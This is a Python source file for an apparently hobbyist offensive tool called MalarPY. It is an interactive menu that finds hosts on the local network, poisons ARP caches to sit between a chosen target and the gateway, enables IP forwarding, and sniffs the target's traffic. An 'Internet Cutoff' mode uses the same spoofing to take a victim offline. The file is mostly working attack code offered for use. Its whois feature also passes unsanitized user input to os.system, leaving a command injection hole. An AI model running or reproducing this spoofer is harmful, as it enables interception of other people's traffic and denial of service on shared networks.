from scapy import interfaces
import scapy.all as scapy
from pick import pick # Pick is used to create interactive menus
import sys
import time
import ipaddress
import pyfiglet
import os
import nmap
import netifaces
import socket
import winreg
import threading
import whois

from help import *
from util import *

# Available flags
flags = {
    "gateway": "-gt",
    "target" : "-t",
    "verbose": "-v",
    "showPkt": "-s"
}

# Available menu options
options = [
    "ARP Spoofer",
    "ARP Table",
    "Connected Machines",
    "Internet Cutoff",
    "Whois Query",
    "Help",
    "Quit"
]

# Returns the IPv4 of the default gateway
def getDefaultGateway():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

# Get MAC address from IP
def getMAC(ip, verbose = False, showPacket = False):
    # Find MAC Address of the specified IP by sending an ARP request to the broadcast MAC Address
    # (Ask the entire network what's the MAC address of the specified IP)


    # Create Ethernet layer for broadcasting
    etherLayer = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # Ethernet layer packet has 3 parameters: destination MAC address, source MAC Address, type
    # Create ARP layer
    arpLayer = scapy.ARP(op = "who-has", pdst = ip)

    # Create full packet
    fullPacket = etherLayer/arpLayer

    if showPacket:
        print("Full packet sent: \n")
        fullPacket.show()

    # Get response from the request
    try:
        res = scapy.srp(fullPacket, timeout = 2, verbose = verbose)[0]

        # Return MAC Address
        return res[0][1].hwsrc

    except:
        print("Unable to get MAC Address for [{}]".format(ip))
        return 0


# Check if passed IP address is a valid IP address
def isValidIP(ip):
    try:
        ipAddress = ipaddress.ip_address(ip)
        return True, str(ipAddress) # Convert output to string as scapy takes IP (str) as argument
    
    except ValueError:
        return False, ip

    
# Display main menu
def menu():
    asciiBanner = pyfiglet.figlet_format("MalarPY")

    option, index = pick(options, asciiBanner, indicator = ">", default_index = 0)
    return option, index
    

# Convert IP from dec form to bin form
def ipToBin(ip):
    return [bin(int(x)+256)[3:] for x in ip.split('.')] # Returns array of 4 binary octets

# Different function to convert an IP to binary (used to validate an IP in the ARP Spoofer)
def ip2Bin(ip):
    octetListInt = ip.split(".")
    octetListBin = [format(int(i), '08b') for i in octetListInt]
    binary = ("").join(octetListBin)
    return binary

# Returns my network interface
def getMyInterface(ip):
    interfaces = netifaces.interfaces() # Get all network interfaces of my machine

    # Loop through the interfaces and look for the main one
    for interface in interfaces:
        ifaddrInterface = netifaces.ifaddresses(interface)
        if ifaddrInterface.get(2) != None:

            if ifaddrInterface[2][0]['addr'] == ip: # If the network interface IPv4 matches your IPv4
                return interface # Return my interface

# Get your subnet mask (use it to calculate network ID)
def getSubnetMask(ip):
    interfaces = netifaces.interfaces() # Get all network interfaces of the machine
    mask = None
    maskBits = 0

    # Loop through the interfaces and look for the main one
    for interface in interfaces:        
        ifaddrInterface = netifaces.ifaddresses(interface)
        if ifaddrInterface.get(2) != None:

            if ifaddrInterface[2][0]['addr'] == ip: # If the network interface IPv4 matches your IPv4:
                
                mask = ifaddrInterface[2][0]['netmask'] # Return the network mask
                break
    
    # Return the amount of `1` bits of the network mask
    binMask = "".join(ipToBin(mask))
    
    # Loop through binary string and count the amount of `1` bits until a `0` is found
    for bit in binMask:
        if bit == '1':
            maskBits = maskBits + 1
        
        else:
            break

    return maskBits

# BC socket.gethostbyname() is dumb, I have to send a UDP request to some DNS server in order to get my actual IPv4
# If you dont do this, socket.gethostbyname() may return the wrong adapter, like Ethernet 2.
#
# Warning: You must be connected to the internet because, well... you have to connect to a DNS server
def getMyIPv4():
    # Create a datagram socket (single UDP request and response, then close)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Connect to an address on the internet that's likely to always be up (cmon google I need you now)
    sock.connect(("8.8.8.8", 80))
    # After connecting, the socket will have your IPv4 in its address field
    return(sock.getsockname()[0])


# Get all hosts connected to your network
# The 'me' flag determines if your own IPv4 is to be displayed in the list (default = True)
# The 'gw' flag determines if the default gateway is to be displayed in the list (default = True)
def getNetworkIPs(me = True, gw = True):
    # Get your IPv4
    IPAddr = getMyIPv4()

    subnetMask = '/' + str(getSubnetMask(IPAddr))

    # Try to fetch hosts with nmap
    nm = nmap.PortScanner()
    result = nm.scan(IPAddr + subnetMask, arguments = '-sn')
    allHosts = nm.all_hosts()

    # Remove my IPv4 from the list if the flag is set to false
    if not me:
        if IPAddr in allHosts:
            allHosts.remove(IPAddr)

    # Remove the default gateway from the list if the flag is set to false
    if not gw:
        defaultGateway = getDefaultGateway()
        if defaultGateway in allHosts:
            allHosts.remove(defaultGateway)


    if len(allHosts) > 0:
        return allHosts

    else:
        print("No hosts found...")
        time.sleep(2)
        return


# Enables ip forwarding on my machine in order to route the packets transmited by the target
#
# By itself the spoof() function cuts the access to the internet to the specified target by making the packets pass through my machine
# In order to get any valuable information we must let the targeted machine reach the internet. Therefore we must do the router's job
#
# IP routing can be enabled on Linux by running the following command 'echo 1 >> /proc/sys/net/ipv4/ip_forward'
# The same can be done on Windows by changing a registry key in 'HKEY_LOCAL_MACHINE \SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter'
def setIPForwarding(setKey):
    osName = getHostOS() # Get host operating system

    registryPath = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" # Path to the registry key (Windows)
    linuxCommand = "echo {} >> /proc/sys/net/ipv4/ip_forward".format(int(setKey)) # Command for Linux
    
    print("[+] Attempting to enable/disable IP forwarding")

    if osName == 'nt': # Change the Registry Key if the Host is on Windows
        try:
            # Get necessary key
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
            storedValue = winreg.QueryValueEx(key, "IPEnableRouter")[0] # Get previously stored value

            # If the registry key is already set to 1, don't do anything
            if storedValue == int(setKey) and storedValue == 1:
                print("[+] Your machine is already configured to route incomming packets")
                time.sleep(1)
                return 1

            elif storedValue == int(setKey) and storedValue == 0:
                print("[+] Your machine is already configured not to route incomming packets")
                time.sleep(1)
                return 1 

            # If the key is not yet set, set it
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, int(setKey))
            winreg.CloseKey(key)
            print("[+] Successfully updated Windows Registry!")
            return 1

        except:
            print("[+] An error has occured when attempting to read/write to the Windows Registry. Try running the terminal as admin...")
            waitForKeyStroke()
            return 0

    else: # Do the same for Linux (See how much time I saved implementing the same shit for Linux? I would suck your toes, Linus Torvalds)
        try:
            os.system(linuxCommand)
            return 1
        except:
            print("[+] An error has occured when attempting to enable/disable IP forwarding. Try running the terminal as root...")
            waitForKeyStroke()
            return 0
    

def dumpPackets(packet):
    if packet.haslayer(scapy.ARP) == False:
        print(packet.summary())

# Intercept packets
def sniffPackets(target, port = None , _type = "any"):
    while do:
        if _type == "any":
            scapy.sniff(filter = f"host {target}", prn = dumpPackets, count=1)
        elif port:
            scapy.sniff(filter = f"{_type} and host {target}", prn = dumpPackets, count=1)
        else:
            scapy.sniff(filter = f"{_type} and host {target}", prn = dumpPackets, count=1)

# ARP Spoofer helper function (sends malicious ARP packet)
def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC, allowThrough = True, summary = True):
    t = threading.Thread(target=sniffPackets, args=(targetIP, None, "tcp",))
    t.setDaemon(True)
    flag = False
    global do
    do = True

    try:
        isForwardSet = setIPForwarding(allowThrough) # Enable/Disable IP forwarding

        # If IP forwarding was successfuly altered:
        if isForwardSet == 1:
            print("Spoofing [{}] (CTRL + C to stop)".format(targetIP))

            while True:
                # Create 2 packets. One will be sent to the default gateway, the other one to the target's machine
                packet1 = scapy.ARP(op = 2, hwdst = gatewayMAC, pdst = gatewayIP, psrc = targetIP) # This packet will be sent to the default gateway
                packet2 = scapy.ARP(op = 2, hwdst = targetMAC, pdst = targetIP, psrc = gatewayIP) # This packet will be sent to the target machine

                # Send both packets
                scapy.send(packet1, verbose = False)
                scapy.send(packet2, verbose = False)

                if not flag:
                    t.start()
                    flag = True

                # Sleep for 2 seconds (Send an ARP response every 2 seconds)
                time.sleep(2)

        
        else:
            print("Unable to set IP forwarding to '{}'... quiting".format(int(allowThrough)))
            time.sleep(1.5)
            
    except KeyboardInterrupt:
        print("Keyboard interrupt detected. Exiting ARP Spoofer...")
        
        do = False
    
        time.sleep(1.5)
        return


# Returns the network address given an IP and a subnet MASK in the CIDR notation (192.168.1.109/24 for example)
def getNetworkAddress(IP, MASKsize):
    # Convert IP address to 32 bit binary
    ipBin = ip2Bin(IP)
    # Extract network ID from 32 bit binary
    network = ipBin[0:32-(32-MASKsize)]
    return network


# Checks if an IP belongs to my network
def isInMyNetwork(IP, prefix):
    # Get the network address of the given IP and compare it to mine
    targetID = getNetworkAddress(IP, prefix)
    myID = getNetworkAddress(getMyIPv4(), prefix)
    return targetID == myID


# Checks if a host belongs to the same network as me
def validateHost(IP):
    myIP = getMyIPv4()
    mask = getSubnetMask(myIP)

    return isInMyNetwork(IP, mask)



def ARPSpoofer():
    asciiBanner = pyfiglet.figlet_format("ARP Spoofer")

    options = ["Manual selection", "Find hosts", "Quit"]
    option, index = pick(options, asciiBanner, indicator = ">", default_index = 0)

    clearTerminal()
    print(asciiBanner)

    if index == 0:
        try:
            IP2Spoof = ""

            # Get the IP to spoof
            while True: 
                clearTerminal()
                print(asciiBanner)
                IP2Spoof = input("Insert an IP to spoof: ")

                if isValidIP(IP2Spoof)[0]: # The first return value [0] of isValidIP() is a True/False flag that indicates if a given IP is valid
                    break

                print("'{}' Is not a valid IP address".format(IP2Spoof))
                time.sleep(0.5)

            # Get the gateway/router
            defaultGateway = getDefaultGateway()
            gw = ""

            while True:
                clearTerminal()
                print(asciiBanner)
                gw = input("Insert the gateway/router IP (default '{}'): ".format(defaultGateway))

                if gw == "":
                    gw = defaultGateway
                    break

                elif isValidIP(gw)[0]:
                    break

                print("'{}' Is not a valid IP address".format(gw))
                time.sleep(0.5)

            print("[+] Target IP: {}".format(IP2Spoof))
            print("[+] Gateway: {}".format(gw))
            time.sleep(0.5)

            print("Validating target's IP...")
            isValid = validateHost(IP2Spoof)
            # If the target doesn't belong to the same network as me, exit
            if not isValid:
                print("The specified IP address '{}' does not belong to the same network as you".format(IP2Spoof))

            time.sleep(0.7)

            print("Validating gateway IP...")
            isValidGW = validateHost(gw)

            if not isValidGW:
                print("The specified gateway '{}' cannot be reached".format(gw))
            

            # Only spoof the target if the hosts are validated
            if isValid and isValidGW:
                # Check if the hosts are UP before trying to spoof them
                time.sleep(1.5)
                print("Checking if hosts are UP...")
                scanner = nmap.PortScanner()
                time.sleep(1)
                print("[+] Pinging '{}'".format(IP2Spoof))
                scanner.scan(IP2Spoof, '1', '-v')
                stateTarget = scanner[IP2Spoof].state()
                
                if stateTarget != 'up':
                    print("[+] Target is [DOWN]")
                else:
                    print("[+] Target is [UP]")

                time.sleep(1)
                print("[+] Pinging '{}'".format(gw))
                scanner.scan(gw, '1', '-v')
                stateGW = scanner[gw].state()

                if stateGW != 'up':
                    print("[+] Gateway is [DOWN]")
                else:
                    print("[+] Gateway is [UP]")
                
                # If both of the hosts are UP, the spoofing can start
                if stateGW == 'up' and stateTarget == 'up':
                    print("Starting the spoofer...")
                    
                    # Get MAC addresses of the target and the gateway
                    targetMAC = getMAC(IP2Spoof)
                    gwMAC = getMAC(gw)

                    if targetMAC == 0 and gwMAC != 0:
                        print("Unable to get MAC address for '{}' (target)".format(IP2Spoof))
                        print("The ARP Spoofer requires both MAC addresses...")
                        waitForKeyStroke()
                        return
                    elif targetMAC != 0 and gwMAC == 0:
                        print("Unable to get MAC address for '{}' (gateway)".format(gw))
                        print("The ARP Spoofer requires both MAC addresses...")
                        waitForKeyStroke()
                        return
                    elif targetMAC == 0 and gwMAC == 0:
                        print("Unable to get both MAC addresses (target and gateway)")
                        print("The ARP spoofer requires both MAC addresses...")
                        waitForKeyStroke()
                        return

                    logIt = input("Would you like to get a log of the incomming packets? (y/n):")

                    if logIt.upper == "Y":
                        spoof(IP2Spoof, targetMAC, gw, gwMAC, summary=True) # Start the spoofer
                    elif logIt.upper == "N":
                        spoof(IP2Spoof, targetMAC, gw, gwMAC) # Start the spoofer
        
                    
                elif stateGW != 'up' or stateTarget != 'up':
                    print("One of the hosts is not UP...")
                    waitForKeyStroke()

                else:
                    print("None of the hosts are up...")
                    waitForKeyStroke()
        
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected, exiting...")
            time.sleep(1.5)



    elif index == 1:
        try:
            print("Fetching the network... this may take a moment")

            allHosts = getNetworkIPs(False, False)

            if len(allHosts) == 0:
                print("Quiting")
                time.sleep(0.7)
                    
            else:
                print("Found {} host/s".format(len(allHosts)))
                time.sleep(1)

                for i in range(0, len(allHosts)):
                    print("{} - {} ({})".format(i + 1, allHosts[i], socket.gethostbyaddr(allHosts[i])[0]))

                IP2Spoof = int(input("Select an IP to spoof: "))
                targetIP = allHosts[IP2Spoof - 1]


                # Get the MAC address of the specified IP address
                MACTarget = getMAC(targetIP)

                # Get MAC address of the default gateway
                defaultGateway = getDefaultGateway()
                dfGWMAC = getMAC(defaultGateway)

                if MACTarget == 0 and dfGWMAC != 0:
                     print("Unable to get MAC address for '{}' (target)".format(targetIP))
                     print("The ARP Spoofer requires both MAC addresses...")
                     waitForKeyStroke()
                     return
                elif MACTarget != 0 and dfGWMAC == 0:
                     print("Unable to get MAC address for '{}' (gateway)".format(defaultGateway))
                     print("The ARP Spoofer requires both MAC addresses...")
                     waitForKeyStroke()
                     return
                elif MACTarget == 0 and dfGWMAC == 0:
                     print("Unable to get both MAC addresses (target and gateway)")
                     print("The ARP spoofer requires both MAC addresses...")
                     waitForKeyStroke()
                     return

                logIt = str(input("Would you like to get a log of the incomming packets? (y/n):"))

                if logIt.upper() == "Y":
                    spoof(targetIP, MACTarget, defaultGateway, dfGWMAC, summary=True) # Start the spoofer
                elif logIt.upper() == "N":
                    spoof(targetIP, MACTarget, defaultGateway, dfGWMAC) # Start the spoofer

            
        except KeyboardInterrupt:
            print("\nKeyboard interrupt detected, exiting...")
            time.sleep(1.5)

    elif index == 2:
        return


# Gets all the machines connected to your network
def connectedMachines():
    asciiBanner = pyfiglet.figlet_format("Connected Machines")

    allMachines = []
    size = 0

    clearTerminal()
    print(asciiBanner)
    print("Fetching your network... This may take a while (CTRL+C to exit)")

    try:
        allMachines = getNetworkIPs()
        size = len(allMachines)
    except KeyboardInterrupt:
        print("Keyboard interrupt detected, exiting...")
        time.sleep(1.7)

    if size > 0:
        print("[+] Found {} machines!".format(size))
        for i in range(0, size):
            if allMachines[i] == getDefaultGateway():
                print("{} - {} ({} | Default Gateway)".format(i + 1, allMachines[i], socket.gethostbyaddr(allMachines[i])[0]))
            else:
                print("{} - {} ({})".format(i + 1, allMachines[i], socket.gethostbyaddr(allMachines[i])[0]))

        print("\n")
        waitForKeyStroke()

# Cuts off access to the internet to the specified host (works most of the time)
def internetCutoff():
    asciiBanner = pyfiglet.figlet_format("Internet Cutoff")

    allMachines = []
    size = 0

    clearTerminal()
    print(asciiBanner)
    print("Please wait while we fetch your network for hosts... (CTRL+C to exit)")

    try:
        allMachines = getNetworkIPs(False, False) # 'False' flags indicate I don't want to list my IPv4 nor my default gateway
        size = len(allMachines)

    except KeyboardInterrupt:
        print("Keyboard interrupt detected, exiting...")
        time.sleep(1.7)

    if size > 0:
        print("[+] Found {} machines!".format(size))
        for i in range(0, size):
            print("{} - {} ({})".format(i + 1, allMachines[i], socket.gethostbyaddr(allMachines[i])[0]))

        IP2Cut = int(input("Choose the host you wish to cut access to the internet: "))
        targetIP = allMachines[IP2Cut - 1]

        # Get the MAC address of the specified IP address
        MACTarget = getMAC(targetIP)

        # Get MAC address of the default gateway
        defaultGateway = getDefaultGateway()
        dfGWMAC = getMAC(defaultGateway)

        if MACTarget == 0 and dfGWMAC != 0:
                print("Unable to get MAC address for '{}' (target)".format(targetIP))
                print("Spoofing requires both MAC addresses...")
                waitForKeyStroke()
                return
        elif MACTarget != 0 and dfGWMAC == 0:
                print("Unable to get MAC address for '{}' (gateway)".format(defaultGateway))
                print("Spoofing requires both MAC addresses...")
                waitForKeyStroke()
                return
        elif MACTarget == 0 and dfGWMAC == 0:
                print("Unable to get both MAC addresses (target and gateway)")
                print("Spoofing requires both MAC addresses...")
                waitForKeyStroke()
                return

        # Spoof
        spoof(targetIP, MACTarget, defaultGateway, dfGWMAC, False)


# Show ARP table
def ARPTable():
    asciiBanner = pyfiglet.figlet_format("ARP Table")
    clearTerminal()
    print(asciiBanner)

    lines = os.popen('arp -a')

    for line in lines:
        print(line)

    waitForKeyStroke()


def whoisQuery():
    asciiBanner = pyfiglet.figlet_format("Whois")
    clearTerminal()
    print(asciiBanner)

    target = input("Insert an IP/Domain Name to search: ")
    
    print("Checking if the host is reachable")
    reachable  = True if os.system("ping -c 1 " + target) is 0 else False

    time.sleep(1)
    clearTerminal()
    print(asciiBanner)

    if reachable:
        print(f"[+] Whois query info for '{target}': \n")
        print(whois.whois(target))
    else:
        print(f"Unable to reach host '{target}'")

    waitForKeyStroke()


def main(argv):
    argv.append("") # Add empty argument in the end bc I am too lazy
    gateway = ""
    target = ""
    verbose = False
    showPacket = False

    if len(argv) > 1:
        
        for i in range(len(argv)): # Gateway argument
            if argv[i] == flags["gateway"] and argv[i+1] not in flags:
                
                isValid, ip = isValidIP(argv[i+1]) # Check if the IP is valid
                gateway = ip

                if not isValid:
                    print("Specified gateway ({}) is not a valid IP address".format(ip))
                    break

            elif argv[i] == flags["target"] and argv[i+1] not in flags:

                isValid, ip = isValidIP(argv[i+1])
                target = ip

                if not isValid:
                    print("Specified target ({}) is not a valid IP address".format(ip))
                    break
            
            elif argv[i] == flags["verbose"]:
                verbose = True

            elif argv[i] == flags["showPkt"]:
                showPacket = True
        
        # Get MAC addresses
        print("MAC address of target = {}".format(getMAC(target, verbose, showPacket)))

    else: # If the user does not pass any arguments start the menu
        while True:

            option, index = menu()
        
            print("Starting {}".format(option))
        
            if index == 0: # Call the ARP Spoofer function
                ARPSpoofer()
            
            if index == 1: # Call ARP table
                ARPTable()

            if index == 2: # Call connected machines function
                connectedMachines()

            if index == 3: # Call internet cutoff function
                internetCutoff()

            if index == 4:
                whoisQuery()

            if index == 5:
                help()

            if index == len(options) - 1:
                clearTerminal()
                os._exit(0)
    
if __name__ == "__main__":
    main(sys.argv[1:])
